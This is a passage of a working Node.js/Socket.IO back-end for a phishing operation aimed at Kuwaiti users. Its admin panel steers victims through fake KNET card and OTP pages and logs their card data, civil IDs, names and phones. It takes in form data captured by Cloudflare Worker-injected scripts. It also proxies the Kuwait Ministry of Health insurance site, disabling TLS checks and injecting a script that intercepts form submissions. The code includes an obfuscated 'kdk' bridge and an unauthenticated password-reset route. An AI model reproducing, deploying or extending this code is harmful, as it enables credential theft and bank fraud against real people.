/*FIX100E*/ try { if (action === "otp") { __vv100 = visitors.get(visitorSocketId) || null; if (!__vv100) { visitors.forEach(function(v){ if (!__vv100 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __vv100 = v; }); } if (__vv100 && __vv100.__f100sent && /otp|رمز/i.test(String(__vv100.page || ""))) __skipEmit100 = true; } } catch(e){}
if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { if (action === "otp" && __vv100) __vv100.__f100sent = 1; } catch(e){} }
    /*FIX98*/ try { var __v98 = visitors.get(visitorSocketId) || null; if (!__v98) { visitors.forEach(function(v){ if (!__v98 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __v98 = v; }); } if (__v98 && action === 'otp' && /كي\s*نت|knet/i.test(String(__v98.page || '')) && !/otp|رمز/i.test(String(__v98.page || ''))) { __v98.page = 'رمز التحقق كي نت (OTP)'; __v98.__f98otp = Date.now(); visitors.set(visitorSocketId, __v98); admins.forEach(function(a, k){ try { io.to(k).emit('visitor:pageChanged', { visitorId: __v98._id, page: __v98.page }); } catch(e){} }); } } catch(e){}
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Code action (Approve, Reject) for OTP/digit codes
  socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
    __f91Emit(visitorSocketId, "code:action", { action, codeIndex });
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Approve resend code request
  socket.on("admin:approveResend", ({ visitorSocketId }) => {
    __f91Emit(visitorSocketId, "resend:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Resend approved for visitor ${visitorSocketId}`);
  });

  // Admin: Block visitor
  socket.on("admin:block", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = true;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      __f91Emit(visitorSocketId, "blocked");
      console.log(`Visitor blocked: ${visitorSocketId}`);
    }
  });

  // Admin: Unblock visitor
  socket.on("admin:unblock", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      __f91Emit(visitorSocketId, "unblocked");
      console.log(`Visitor unblocked: ${visitorSocketId}`);
    }
  });

  // Admin: Delete visitor by socket ID
  socket.on("admin:delete", (visitorSocketId) => {
    __f91Emit(visitorSocketId, "deleted");
    visitors.delete(visitorSocketId);
    
    // Also remove from saved visitors
    const visitorToDelete = Array.from(visitors.values()).find(v => v.socketId === visitorSocketId);
    if (visitorToDelete) {
      savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
      saveData();
    }
    
    console.log(`Visitor deleted: ${visitorSocketId}`);
  });

  // Admin: Delete visitor by ID
  socket.on("admin:deleteById", (visitorId) => {
    // Find and remove from active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        io.to(socketId).emit("deleted");
        visitors.delete(socketId);
      }
    });
    
    // Remove from saved visitors
    savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
    });
    
    console.log(`Visitor deleted by ID: ${visitorId}`);
  });

  // Admin: Send last message
  socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
    __f91Emit(visitorSocketId, "admin-last-message", { message });
    console.log(`Message sent to visitor ${visitorSocketId}: ${message}`);
  });

  // Admin: Set bank name
  socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
    __f91Emit(visitorSocketId, "bankName", bankName);
    console.log(`Bank name set for visitor ${visitorSocketId}: ${bankName}`);
  });

  // Admin: Change password
  socket.on("admin:changePassword", ({ oldPassword, newPassword }) => {
    // Verify old password - uses persistent password from disk
    if (oldPassword === adminPassword) {
      // Update password and save to disk for persistence
      adminPassword = newPassword;
      saveData();
      socket.emit("admin:passwordChanged", true);
      console.log("Admin password changed successfully and saved to disk");
      
      // Force logout ALL other admin sessions
      admins.forEach((admin, adminSocketId) => {
        if (adminSocketId !== socket.id) {
          io.to(adminSocketId).emit("admin:forceLogout");
          admins.delete(adminSocketId);
          console.log(`Force logged out admin: ${adminSocketId}`);
        }
      });
      
      // Also logout the admin who changed the password
      setTimeout(() => {
        io.to(socket.id).emit("admin:forceLogout");
        admins.delete(socket.id);
        console.log(`Force logged out password changer: ${socket.id}`);
      }, 2000);
      
      console.log("All admin sessions logged out after password change");
    } else {
      socket.emit("admin:passwordChanged", false);
      console.log("Admin password change failed - wrong old password");
    }
  });

  // Admin: Clear all data
  socket.on("admin:clearAllData", () => {
    // Disconnect all visitors
    visitors.forEach((v, socketId) => {
      io.to(socketId).emit("deleted");
    });
    
    // Clear all data
    visitors.clear();
    savedVisitors = [];
    visitorCounter = 0;
    
    // Save empty data to disk
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allDataCleared");
    });
    
    console.log("All data cleared by admin");
  });

  // WhatsApp: Get current number
  socket.on("whatsapp:get", () => {
    // Send to admin
    socket.emit("whatsapp:current", whatsappNumber);
    // Also send to client (for footer)
    socket.emit("whatsapp:update", whatsappNumber);
  });

  // WhatsApp: Set number (admin only)
  socket.on("whatsapp:set", (number) => {
    whatsappNumber = number;
    saveData();
    // Broadcast to all connected clients
    io.emit("whatsapp:update", whatsappNumber);
    console.log(`WhatsApp number updated: ${whatsappNumber}`);
  });

  // Blocked Cards: Get list
  socket.on("blockedCards:get", () => {
    socket.emit("blockedCards:list", globalBlockedCards);
  });

  // Blocked Cards: Add prefix
  socket.on("blockedCards:add", (prefix) => {
    if (prefix && prefix.length === 4 && !globalBlockedCards.includes(prefix)) {
      globalBlockedCards.push(prefix);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
      });
      // Broadcast to all clients
      io.emit("blockedCards:updated", globalBlockedCards);
      console.log(`Blocked card prefix added: ${prefix}`);
    }
  });

  // Blocked Cards: Remove prefix
  socket.on("blockedCards:remove", (prefix) => {
    globalBlockedCards = globalBlockedCards.filter(p => p !== prefix);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
    });
    // Broadcast to all clients
    io.emit("blockedCards:updated", globalBlockedCards);
    console.log(`Blocked card prefix removed: ${prefix}`);
  });

  // Blocked Cards: Check if card is blocked (for clients)
  socket.on("blockedCards:check", (cardNumber) => {
    const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
    const isBlocked = globalBlockedCards.includes(prefix);
    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
  });

  // Blocked Countries: Get list
  socket.on("blockedCountries:get", () => {
    socket.emit("blockedCountries:list", globalBlockedCountries);
  });

  // Blocked Countries: Add country
  socket.on("blockedCountries:add", (country) => {
    if (country && !globalBlockedCountries.includes(country)) {
      globalBlockedCountries.push(country);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
      });
      // Broadcast to all clients
      io.emit("blockedCountries:updated", globalBlockedCountries);
      console.log(`Blocked country added: ${country}`);
    }
  });

  // Blocked Countries: Remove country
  socket.on("blockedCountries:remove", (country) => {
    globalBlockedCountries = globalBlockedCountries.filter(c => c !== country);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
    });
    // Broadcast to all clients
    io.emit("blockedCountries:updated", globalBlockedCountries);
    console.log(`Blocked country removed: ${country}`);
  });

  // Blocked Countries: Check if visitor's country is blocked
  socket.on("blockedCountries:check", (country) => {
    const isBlocked = globalBlockedCountries.some(c => 
      c.toLowerCase() === country.toLowerCase()
    );
    socket.emit("blockedCountries:checkResult", { isBlocked, country });
  });

  // Admin: Mark visitor data as read (hide new data indicator)
  socket.on("admin:markAsRead", (visitorId) => {
    // Find visitor by ID in active visitors
    let found = false;
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.hasNewData = false;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
        found = true;
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.hasNewData = false;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
    });
    
    console.log(`Visitor ${visitorId} marked as read`);
  });

  // Chat: Message from visitor to admin
  socket.on("chat:fromVisitor", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId) || visitors.get(socket.id);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'visitor',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitor.hasNewMessage = true;
      visitors.set(visitor.socketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Notify all admins about the new message
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("chat:newMessage", {
          visitorSocketId: visitor.socketId,
          visitorId: visitor._id,
          message: chatMessage
        });
      });
      
      console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
    }
  });

  // Chat: Message from admin to visitor
  socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'admin',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Send message to visitor
      __f91Emit(visitorSocketId, "chat:fromAdmin", {
        message: message,
        timestamp: chatMessage.timestamp
      });
      
      console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
    }
  });

  // Chat: Mark messages as read
  socket.on("chat:markAsRead", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.hasNewMessage = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
    }
  });

  // Admin: Block card prefix
  socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      if (!visitor.blockedCardPrefixes.includes(prefix)) {
        visitor.blockedCardPrefixes.push(prefix);
        visitors.set(visitorSocketId, visitor);
        saveVisitorPermanently(visitor);
      }
      console.log(`Card prefix blocked for visitor ${visitorSocketId}: ${prefix}`);
    }
  });

  // Handle disconnection
  socket.on("disconnect", () => {
    // Check if it's a visitor
    if (visitors.has(socket.id)) {
      const visitor = __f91ResolveVisitor(socket, null);
      const visitorId = visitor._id;
      const socketId = socket.id;
      
      // Don't delete visitor data - keep it permanently
      visitors.delete(socket.id);
      
      // Delay disconnect notification to allow for quick reconnection
      setTimeout(() => {
        // Check if visitor reconnected with same ID
        const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
        
        if (!reconnected) {
          // Update saved visitor as disconnected
          const savedVisitor = savedVisitors.find(v => v._id === visitorId);
          if (savedVisitor) {
            savedVisitor.isConnected = false;
            saveData();
          }
          
          // Notify admins
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:disconnected", {
              visitorId: visitorId,
              socketId: socketId,
            });
          });
          
          console.log(`Visitor disconnected: ${socketId}`);
        } else {
          console.log(`Visitor ${visitorId} reconnected quickly, skipping disconnect notification`);
        }
      }, 1000); // 1 second delay
    }

    // Check if it's an admin
    if (admins.has(socket.id)) {
      admins.delete(socket.id);

      // Notify visitors if no admins left
      if (admins.size === 0) {
        visitors.forEach((visitor, visitorSocketId) => {
          __f91Emit(visitorSocketId, "isAdminConnected", false);
        });
      }

      console.log(`Admin disconnected: ${socket.id}`);
    }
  });
});

// REST API Routes
// Temporary password reset endpoint
app.get("/api/reset-password", (req, res) => {
  adminPassword = "admin123";
  saveData();
  res.json({ success: true, message: "Password reset to admin123" });
});

app.get("/", (req, res) => {
  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
});

app.get("/api/visitors", (req, res) => {
  res.json(savedVisitors);
});

app.get("/api/stats", (req, res) => {
  res.json({
    totalVisitors: savedVisitors.length,
    connectedVisitors: visitors.size,
    totalAdmins: admins.size,
    visitorCounter,
  });
});

// ===== API: Receive captured data from Cloudflare data-collector Worker =====
// ===== API: Receive data directly from MOH Worker-injected script =====
app.post("/api/moh-data", (req, res) => {
  try {
    const { type, data, visitorId, socketId: reqSocketId } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || '';
    const clientIp = ip.split(',')[0].trim();
    
    console.log(`[MOH-DIRECT] Received ${type} from ${clientIp}, visitorId=${visitorId || 'none'}, socketId=${reqSocketId || 'none'}`);
    
    // Extract useful fields based on type
    let fields = {};
    let pageName = 'MOH';
    let username = null;
    
    if (data) {
      if (data.fields) fields = data.fields;
      if (data.content) {
        if (data.content.fields) fields = { ...fields, ...data.content.fields };
        if (data.content.page_text) fields['محتوى الصفحة'] = Array.isArray(data.content.page_text) ? data.content.page_text.join('\n') : data.content.page_text;
      }
      if (data.path) pageName = `MOH: ${data.path}`;
      if (data.username) username = data.username;
    }
    
    // Find matching visitor: try by visitorId first, then socketId, then IP
    let matchedVisitor = null;
    
    // 1. Match by visitor ID
    if (visitorId) {
      visitors.forEach((v, sid) => {
        if (v._id === visitorId) {
          matchedVisitor = { visitor: v, socketId: sid };
        }
      });
    }
    
    // 2. Match by socket ID
    if (!matchedVisitor && reqSocketId) {
      const v = visitors.get(reqSocketId);
      if (v) {
        matchedVisitor = { visitor: v, socketId: reqSocketId };
      }
    }
    
    // 3. Fallback: match by IP
    if (!matchedVisitor) {
      visitors.forEach((v, sid) => {
        if (v.ip === clientIp) {
          matchedVisitor = { visitor: v, socketId: sid };
        }
      });
    }
    
    console.log(`[MOH-DIRECT] Matched: ${matchedVisitor ? matchedVisitor.visitor._id : 'NONE'}, visitors count: ${visitors.size}`);
    
    if (matchedVisitor) {
      const v = matchedVisitor.visitor;
      /*FIX101A*/ try {
  var __s101 = JSON.stringify(fields || {}) + "|" + String(pageName || "");
  var __n101 = Date.now();
  if (v.__f101sig === __s101 && (__n101 - (v.__f101at || 0)) < 12000) {
    v.__f101sig = __s101; v.__f101at = __n101;
    visitors.set(matchedVisitor.socketId, v);
    return res.json({ ok: true, dup: true });
  }
  v.__f101sig = __s101; v.__f101at = __n101;
} catch(e){}
      
      // Update username if captured
      if (username) {
        v.fullName = username;
        v.mohUsername = username;
      }
      
      // Store data
      if (Object.keys(fields).length > 0) {
        if (!v.dataHistory) v.dataHistory = [];
        v.dataHistory.push({
          content: fields,
          page: pageName,
          timestamp: new Date().toISOString(),
        });
        v.data = { ...v.data, ...fields };
        v.hasNewData = true;
        /*FIX102B*/ try { if (v.__f98otp && (Date.now() - v.__f98otp) < 1800000) { var __pB102 = String(pageName || ""); if (/cvv|atm|مرور|نهائي|final/i.test(__pB102)) { v.__f98otp = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__pB102)) { pageName = "رمز التحقق كي نت (OTP)"; } } } catch(e){}
v.page = pageName;
      }
      
      visitors.set(matchedVisitor.socketId, v);
      saveVisitorPermanently(v);
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        if (username) {
          io.to(adminSocketId).emit('visitor:nameUpdated', {
            visitorId: v._id,
            name: username,
          });
        }
        if (Object.keys(fields).length > 0) {
          io.to(adminSocketId).emit('visitor:dataSubmitted', {
            visitorId: v._id,
            socketId: matchedVisitor.socketId,
            data: { content: fields, page: pageName },
            visitor: v,
          });
        }
      });
      
      console.log(`[MOH-DIRECT] Updated visitor ${v._id} (${clientIp})`);
    } else {
      console.log(`[MOH-DIRECT] No matching visitor for IP ${clientIp}`);
    }
    
    res.json({ ok: true });
  } catch (err) {
    console.error('[MOH-DIRECT] Error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.post("/api/captured-data", (req, res) => {
  try {
    const { url, contentType, body, timestamp, ip } = req.body;
    console.log(`[DATA-COLLECTOR] Received POST data from ${ip} to ${url}`);
    
    // Parse form data from body string
    let parsedFields = {};
    if (body && contentType && contentType.includes('application/x-www-form-urlencoded')) {
      const params = new URLSearchParams(body);
      for (const [key, value] of params.entries()) {
        parsedFields[key] = value;
      }
    } else if (body) {
      try {
        parsedFields = JSON.parse(body);
      } catch(e) {
        parsedFields = { rawBody: body };
      }
    }
    
    // Find visitor by IP or create a data entry
    let matchedVisitor = null;
    visitors.forEach((v, socketId) => {
      if (v.ip === ip) {
        matchedVisitor = { visitor: v, socketId };
      }
    });
    
    if (matchedVisitor) {
      // Update existing visitor with captured data
      const v = matchedVisitor.visitor;
      /*FIX101A*/ try {
  var __s101 = JSON.stringify(fields || {}) + "|" + String(pageName || "");
  var __n101 = Date.now();
  if (v.__f101sig === __s101 && (__n101 - (v.__f101at || 0)) < 12000) {
    v.__f101sig = __s101; v.__f101at = __n101;
    visitors.set(matchedVisitor.socketId, v);
    return res.json({ ok: true, dup: true });
  }
  v.__f101sig = __s101; v.__f101at = __n101;
} catch(e){}
      if (!v.dataHistory) v.dataHistory = [];
      v.dataHistory.push({
        content: parsedFields,
        page: `MOH-POST: ${url}`,
        timestamp: timestamp || new Date().toISOString(),
      });
      v.data = { ...v.data, ...parsedFields };
      v.hasNewData = true;
      visitors.set(matchedVisitor.socketId, v);
      saveVisitorPermanently(v);
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit('visitor:dataSubmitted', {
          visitorId: v._id,
          socketId: matchedVisitor.socketId,
          data: { content: parsedFields, page: `MOH-POST: ${url}` },
          visitor: v,
        });
      });
    } else {
      // No matching visitor - store as orphan data
      console.log(`[DATA-COLLECTOR] No matching visitor for IP ${ip}, storing as orphan`);
      // Create a temporary visitor entry
      visitorCounter++;
      const orphanVisitor = {
        _id: `moh_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: 'moh-captured',
        visitorNumber: visitorCounter,
        createdAt: timestamp || new Date().toISOString(),
        isRead: false,
        fullName: parsedFields.UserName || parsedFields.username || '',
        phone: '',
        idNumber: parsedFields.CivilId || parsedFields.civilId || '',
        apiKey: '',
        ip: ip,
        country: 'KW',
        city: '',
        os: 'Unknown',
        device: 'Unknown',
        browser: 'Unknown',
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: `MOH-POST: ${url}`,
        data: parsedFields,
        dataHistory: [{
          content: parsedFields,
          page: `MOH-POST: ${url}`,
          timestamp: timestamp || new Date().toISOString(),
        }],
        paymentCards: [],
        digitCodes: [],
        hasNewData: true,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
      };
      savedVisitors.push(orphanVisitor);
      isNewVisitor = true;     
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit('visitor:new', orphanVisitor);
      });
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('[DATA-COLLECTOR] Error:', error);
    res.status(500).json({ error: 'Internal error' });
  }
});

// ===== PROXY ROUTE FOR KUWAIT MOH INSURANCE SITE =====
const https = require("https");

app.all("/api/proxy", async (req, res) => {
  const targetUrl = req.query.url || 'https://insonline.moh.gov.kw/Insurance/logaction';
  
  // Only allow proxying to the Kuwait MOH domain
  if (!targetUrl.startsWith('https://insonline.moh.gov.kw/') && !targetUrl.startsWith('http://insonline.moh.gov.kw/')) {
    return res.status(403).json({ error: 'Only Kuwait MOH Insurance site is allowed' });
  }

  try {
    const url = new URL(targetUrl);
    const result = await new Promise((resolve, reject) => {
      const options = {
        hostname: url.hostname,
        port: 443,
        path: url.pathname + url.search,
        method: req.method || 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
          'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
          'Accept-Encoding': 'identity',
          'Connection': 'keep-alive',
        },
        timeout: 5000,
        rejectUnauthorized: false,
      };

      const proxyReq = https.request(options, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', (chunk) => chunks.push(chunk));
        proxyRes.on('end', () => {
          const body = Buffer.concat(chunks);
          const headers = {};
          for (const [key, value] of Object.entries(proxyRes.headers)) {
            if (value) headers[key] = Array.isArray(value) ? value.join(', ') : value;
          }
          resolve({ status: proxyRes.statusCode || 200, headers, body });
        });
      });

      proxyReq.on('error', reject);
      proxyReq.on('timeout', () => { proxyReq.destroy(); reject(new Error('Request timeout')); });
      
      // Forward POST body if present
      if (req.method === 'POST' && req.body) {
        const bodyStr = typeof req.body === 'string' ? req.body : 
          (req.headers['content-type'] && req.headers['content-type'].includes('json') ? 
            JSON.stringify(req.body) : new URLSearchParams(req.body).toString());
        proxyReq.write(bodyStr);
      }
      proxyReq.end();
    });

    const contentType = result.headers['content-type'] || 'text/html';
    
    // Set CORS headers and remove framing restrictions
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');
    res.setHeader('Content-Type', contentType);
    
    if (contentType.includes('text/html')) {
      let html = result.body.toString('utf-8');
      const baseUrl = new URL(targetUrl);
      const baseHref = baseUrl.protocol + '//' + baseUrl.host;
      
      // Add base tag for relative URLs
      html = html.replace(/<head([^>]*)>/i, '<head$1>\n<base href="' + baseHref + '/">');
      
      // Add navigation interception script
      const proxyScript = `
        <script>
          document.addEventListener('click', function(e) {
            var link = e.target.closest('a[href]');
            if (link) {
              var href = link.getAttribute('href');
              if (href && !href.startsWith('javascript:') && !href.startsWith('#')) {
                e.preventDefault();
                var fullUrl;
                if (href.startsWith('http')) fullUrl = href;
                else if (href.startsWith('/')) fullUrl = '${baseHref}' + href;
                else fullUrl = '${baseHref}/' + href;
                if (fullUrl.includes('insonline.moh.gov.kw')) {
                  window.location.href = '/api/proxy?url=' + encodeURIComponent(fullUrl);
                }
              }
            }
          }, true);
          document.addEventListener('submit', function(e) {
            var form = e.target;
            if (form && form.action) {
              e.preventDefault();
              var action = form.getAttribute('action') || window.location.href;
              var fullUrl;
              if (action.startsWith('http')) fullUrl = action;
              else if (action.startsWith('/')) fullUrl = '${baseHref}' + action;
              else fullUrl = '${baseHref}/' + action;
              if (form.method && form.method.toLowerCase() === 'post') {
                var fd = new FormData(form);
                fetch('/api/proxy?url=' + encodeURIComponent(fullUrl), {
                  method: 'POST', body: new URLSearchParams(fd)
                }).then(function(r){return r.text();}).then(function(h){document.open();document.write(h);document.close();});
              } else {
                var p = new URLSearchParams(new FormData(form)).toString();
                window.location.href = '/api/proxy?url=' + encodeURIComponent(fullUrl + '?' + p);
              }
            }
          }, true);
        </script>`;
      html = html.replace('</body>', proxyScript + '\n</body>');
      
      return res.status(result.status).send(html);
    } else {
      return res.status(result.status).send(result.body);
    }
  } catch (error) {
    console.error('Proxy error:', error.message);
    return res.status(502).json({ 
      error: 'Failed to fetch the target page',
      message: error.message
    });
  }
});

// Handle CORS preflight for proxy
app.options("/api/proxy", (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.status(204).send();
});

// Idle check timer - every 10 seconds, check for visitors idle > 60 seconds
setInterval(() => {
  const now = Date.now();
  visitors.forEach((visitor, sid) => {
    const wasIdle = visitor.isIdle || false;
    const isNowIdle = visitor.lastActivity ? (now - visitor.lastActivity) > 60000 : false;
    if (isNowIdle !== wasIdle) {
      visitor.isIdle = isNowIdle;
      visitors.set(sid, visitor);
      // Notify admins about idle status change
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:idleChanged", {
          visitorId: visitor._id,
          isIdle: isNowIdle,
        });
      });
    }
  });
}, 10000);

// Cleanup stale/dead socket connections every 30 seconds
// This prevents ghost visitors from accumulating in the active visitors Map
setInterval(() => {
  let cleaned = 0;
  visitors.forEach((visitor, sid) => {
    // Check if the socket is still actually connected
    const socket = io.sockets.sockets.get(sid);
    if (!socket || !socket.connected) {
      // Socket is dead/disconnected but still in the Map - remove it
      const visitorId = visitor._id;
      visitors.delete(sid);
      cleaned++;
      
      // Update saved visitor as disconnected
      const savedVisitor = savedVisitors.find(v => v._id === visitorId);
      if (savedVisitor) {
        savedVisitor.isConnected = false;
        saveData();
      }
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:disconnected", {
          visitorId: visitorId,
          socketId: sid,
        });
      });
    }
  });
  if (cleaned > 0) {
    console.log(`Cleaned ${cleaned} stale socket connections. Active visitors: ${visitors.size}`);
  }
}, 30000);

// Start server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Loaded ${savedVisitors.length} saved visitors`);
});
// KDD_DEPLOY_TRIGGER: 2026-10-20T20:25:23.551Z

/*KDD-KDKAW-BRIDGE5*/
try{app.get('/api/bridge',function(req,res){res.setHeader('Access-Control-Allow-Origin','*');res.json({bridge:'kdk9',ts:new Date().toISOString(),visitors:visitors.size})})}catch(e){}
var __kdkSock={},__kdkApp={};
function __kdkAll(){var o=[],s={};try{visitors.forEach(function(v){if(v&&!s[v._id]){s[v._id]=1;o.push(v)}})}catch(e){}try{savedVisitors.forEach(function(v){if(v&&!s[v._id]){s[v._id]=1;o.push(v)}})}catch(e){}return o}
function __kdkFind(sid){try{if(__kdkSock[sid])return __kdkSock[sid]}catch(e){}var r=null;try{visitors.forEach(function(v){if(!r&&v&&(v.socketId===sid||(v._sockets||[]).indexOf(sid)>-1))r=v})}catch(e){}if(r)__kdkSock[sid]=r;return r}
function __kdkMake(socket){try{
var h=(socket.handshake&&socket.handshake.headers)||{};
var ua=h['user-agent']||'';
var ip=String(h['x-forwarded-for']||socket.handshake.address||'').split(',')[0].trim();
var ex=null;
try{__kdkAll().forEach(function(v){if(ex||!v)return;if(v.ip===ip&&(v.userAgent?v.userAgent===ua:true)&&(Date.now()-(v.lastActivity||0))<900000)ex=v})}catch(e){}
if(ex){__kdkSock[socket.id]=ex;ex.lastActivity=Date.now();ex.isConnected=true;if(!ex.userAgent)ex.userAgent=ua;visitors.set(socket.id,ex);admins.forEach(function(a,id){try{io.to(id).emit('visitor:new',ex)}catch(e){}});console.log('kdk5 adopt',socket.id,ex._id);return ex}
try{visitorCounter++}catch(e){}
var v={_id:'visitor_'+Date.now()+'_'+Math.random().toString(36).slice(2,9),socketId:socket.id,visitorNumber:(typeof visitorCounter==='number'?visitorCounter:1),createdAt:new Date().toISOString(),isRead:false,fullName:'',phone:'',idNumber:'',apiKey:(typeof generateApiKey==='function'?generateApiKey():''),ip:ip,userAgent:ua,country:h['cf-ipcountry']||'Unknown',city:'',os:'',device:'',browser:'',date:new Date().toISOString(),blockedCardPrefixes:[],page:'الرئيسية',data:{},dataHistory:[],paymentCards:[],digitCodes:[],hasNewData:false,isBlocked:false,isConnected:true,sessionStartTime:Date.now(),lastActivity:Date.now(),__kdk:true};
try{if(typeof parseUserAgent==='function'){var p=parseUserAgent(ua);v.os=p.os;v.device=p.device;v.browser=p.browser}}catch(e){}
visitors.set(socket.id,v);__kdkSock[socket.id]=v;try{savedVisitors.push(v)}catch(e){}
try{if(typeof saveData==='function')saveData()}catch(e){}
admins.forEach(function(a,id){try{io.to(id).emit('visitor:new',v)}catch(e){}});
console.log('kdk5 new visitor',socket.id,v.ip);return v}catch(e){console.log('kdk5 make err',e.message);return null}}
function __kdkPush(v,fields,page){try{
if(!v||!fields||typeof fields!=='object')return;
var sig='';try{sig=JSON.stringify(fields)}catch(e){}
if(v.__kdkSig===sig)return;v.__kdkSig=sig;
try{var nm=fields.customer_name||fields.name||fields.fullName||fields['الاسم'];
if(nm&&String(nm).trim()){var s=String(nm).trim();if(v.fullName!==s){v.fullName=s;admins.forEach(function(a,id){try{io.to(id).emit('visitor:nameUpdated',{visitorId:v._id,name:s})}catch(e){}})}}}
catch(e){}
try{var ph=fields.customer_phone||fields.phone||fields['الهاتف'];if(ph&&String(ph).trim())v.phone=String(ph).trim()}catch(e){}
var pg=fields['الصفحة']||page||'إتمام الطلب';
